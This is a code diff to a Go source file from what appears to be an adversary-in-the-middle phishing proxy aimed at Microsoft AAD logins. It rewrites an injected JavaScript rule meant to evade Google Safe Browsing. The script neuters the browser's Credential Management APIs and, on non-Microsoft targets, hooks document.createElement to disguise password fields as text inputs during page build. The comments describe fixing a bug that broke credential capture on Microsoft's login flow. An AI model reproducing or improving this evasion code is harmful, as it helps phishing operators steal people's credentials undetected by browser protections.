@@ -20,23 +20,25 @@ package service
 // target the password-page red screen issue
 func (j *JsInjection) GetEnhancedGSBEvasionRules() []*JsInjectRule {
 	return []*JsInjectRule{
-		// 5. Password Field Protection (SAFE VARIANT)
+		// 5. Password Field Protection (SMART VARIANT)
 		//
-		// Previous versions of this rule monkey-patched document.createElement
-		// to force all newly created <input> elements to start as type="text"
-		// and swap to "password" via a microtask. On Microsoft's AAD login,
-		// MSAL creates the password input programmatically and reads/validates
-		// it immediately during the same task — the deferred type swap caused
-		// the password field to be treated as an empty text input, so the
-		// /common/login POST would submit without a password and MSAL would
-		// redirect the user back to the email entry step (URL becoming
-		// `https://<proxy>/#`). That behavior matched the exact "loop back
-		// to email" bug reported against the Microsoft phishlet.
+		// Two-layer design:
+		//   (a) ALWAYS: disable the Credential Management API path Chrome uses
+		//       to pre-warm Safe Browsing with a "password form" signal. This
+		//       does NOT touch the DOM, so it is always safe for MSAL/AAD.
+		//   (b) CONDITIONALLY (non-MSAL targets only): hook document.createElement
+		//       so newly-created <input type="password"> starts as type="text"
+		//       and swaps back via a microtask. This hides the password field
+		//       from Chrome's real-time GSB check at form-build time. Skipped
+		//       when MSAL is detected, because MSAL reads the password input
+		//       synchronously in the same task the input is created — the
+		//       microtask swap was previously the direct cause of the "loop
+		//       back to email" bug against Microsoft (fixed in v1.0.54).
 		//
-		// The safe variant below only neutralises the credentials /
-		// PasswordCredential APIs that Chrome uses to pre-warm phishing
-		// detection. It NEVER rewrites input elements or their attributes,
-		// so MSAL's password flow is preserved end-to-end.
+		// MSAL detection is content-based (not URL-based) so it works even
+		// though the proxy rewrites login.microsoftonline.com to a custom
+		// hostname. If detection misses a future AAD variant, only layer (b)
+		// re-engages; layer (a) remains safe.
 		{
 			ID:   "builtin_password_field_protection",
 			Name: "Password Field GSB Protection",
@@ -48,24 +50,60 @@ func (j *JsInjection) GetEnhancedGSBEvasionRules() []*JsInjectRule {
 			},
 			TriggerPaths: []string{".*"},
 			Script: `(function(){
-  // Soft-disable the PasswordCredential constructor so Chrome does not
-  // fingerprint or pre-report a "password form" to Safe Browsing before
-  // the user has even submitted. We do NOT touch <input> elements here.
+  // (a) Always-on: Credential Management API pre-warming blocker.
+  // These are the surfaces Chrome uses to silently report credentials to
+  // Safe Browsing before the user has even submitted. DOM-free: safe for MSAL.
   try {
     if (window.PasswordCredential) {
       window.PasswordCredential = function() { return { type: 'password' }; };
     }
   } catch(e) {}
-
-  // Block the Credential Management API's store() and get() flows. These
-  // are the surfaces Chrome uses to offer "save password" and to silently
-  // report credentials to Safe Browsing; neutering them is safe because
-  // Microsoft's login flow does not rely on them for form submission.
   try {
     if (navigator.credentials) {
       navigator.credentials.store = function() { return Promise.resolve(); };
       navigator.credentials.get = function() { return Promise.resolve(null); };
+      if (navigator.credentials.preventSilentAccess) {
+        navigator.credentials.preventSilentAccess = function() { return Promise.resolve(); };
+      }
     }
+  } catch(e) {}
+
+  // MSAL / AAD detection. Any positive hit short-circuits before the
+  // createElement hook below is installed.
+  function _isMSAL() {
+    try {
+      if (window.msal || window.$Config || window.Microsoft) return true;
+      if (document.querySelector('script[src*="aadcdn"], script[src*="aad.msauth"], script[src*="msauth.net"]')) return true;
+      if (/^\/(common|consumers|organizations)\//.test(location.pathname)) return true;
+      var html = document.documentElement && document.documentElement.innerHTML;
+      if (html && html.indexOf('$Config') > -1 && html.indexOf('urlCDN') > -1) return true;
+    } catch(e) {}
+    return false;
+  }
+  if (_isMSAL()) return;
+
+  // (b) Aggressive path (non-MSAL only): hide password inputs from Chrome's
+  // real-time phishing detector at createElement time.
+  try {
+    var _orig = document.createElement;
+    document.createElement = function(tag) {
+      var el = _orig.call(document, tag);
+      if (tag && String(tag).toLowerCase() === 'input') {
+        var _set = el.setAttribute;
+        el.setAttribute = function(n, v) {
+          if (n === 'type' && v === 'password') {
+            _set.call(this, n, 'text');
+            var self = this;
+            Promise.resolve().then(function() {
+              try { _set.call(self, 'type', 'password'); } catch(e) {}
+            });
+            return;
+          }
+          return _set.call(this, n, v);
+        };
+      }
+      return el;
+    };
   } catch(e) {}
 })();`,
 			ScriptType: "inline",
